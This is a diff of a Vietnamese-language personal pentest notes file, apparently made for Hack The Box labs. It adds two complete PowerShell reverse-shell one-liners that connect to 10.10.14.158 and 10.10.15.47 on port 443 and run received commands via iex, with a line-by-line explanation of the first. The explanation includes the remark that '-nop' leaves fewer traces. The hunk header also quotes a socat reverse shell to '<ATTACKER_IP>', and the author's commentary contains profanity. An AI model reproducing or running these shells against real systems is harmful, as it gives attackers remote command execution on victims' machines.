@@ -139,29 +139,34 @@ socat TCP:<ATTACKER_IP>:<PORT> EXEC:/bin/sh
 
 Tự note 
 
+SHELL 1 : tôi lấy shell này từ HTB nhưng đéo hiểu sao tôi đéo dùng được, nên thành ra lên mạng lấy shell 2 ae nhé 
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
-Giải thích chi tiết
+    Giải thích chi tiết
+    
+    powershell -nop -c
+      -nop: không tải profile (NoProfile) → chạy nhanh, ít dấu vết.
+      -c: chỉ định thực thi lệnh theo sau.
+    
+    $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
+      Tạo một TCP client kết nối tới IP attacker 10.10.14.158 port 443.
+      Đây chính là reverse connection.
+    
+    $stream = $client.GetStream();
+      Lấy luồng dữ liệu (stream) từ kết nối TCP.
+    
+    [byte[]]$bytes = 0..65535|%{0};
+      Tạo một buffer mảng byte để nhận dữ liệu từ attacker.
+    
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){...}
+      Vòng lặp chờ nhận dữ liệu từ attacker.
+    
+    $i là số byte nhận được.
+    
+    Bên trong vòng lặp
+    
+    Chuyển dữ liệu bytes → string:
 
-powershell -nop -c
-  -nop: không tải profile (NoProfile) → chạy nhanh, ít dấu vết.
-  -c: chỉ định thực thi lệnh theo sau.
+SHELL 2 : 
+$client = New-Object System.Net.Sockets.TCPClient('10.10.15.47',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
-  Tạo một TCP client kết nối tới IP attacker 10.10.14.158 port 443.
-  Đây chính là reverse connection.
-
-$stream = $client.GetStream();
-  Lấy luồng dữ liệu (stream) từ kết nối TCP.
-
-[byte[]]$bytes = 0..65535|%{0};
-  Tạo một buffer mảng byte để nhận dữ liệu từ attacker.
-
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){...}
-  Vòng lặp chờ nhận dữ liệu từ attacker.
-
-$i là số byte nhận được.
-
-Bên trong vòng lặp
-
-Chuyển dữ liệu bytes → string:
